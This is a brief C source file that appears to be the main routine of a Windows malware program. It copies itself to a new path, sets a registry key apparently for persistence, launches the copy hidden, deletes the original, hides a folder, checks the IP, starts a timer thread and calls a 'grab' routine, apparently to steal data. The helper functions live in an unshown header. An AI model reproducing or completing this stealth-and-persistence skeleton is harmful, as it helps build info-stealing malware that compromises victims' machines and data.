#include "functions.h"
//---------------------------------------
int main()
{
	getVars();
	//---------------------------------------
	if (checkFile() == 0)
	{
		if (checkPath() != 0)
		{
			char *filepath = createFile();
			createRegKey(filepath);
			ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
			free(filepath);
			selfDelete();
			exit(1);
		}
		else createRegKey(sfilepath);
	}
	//---------------------------------------
	hideFolder();
	checkIP();
	CreateThread(NULL, 0, createTimer, NULL, 0, NULL);
	grab();
	//---------------------------------------
	return 0;
}
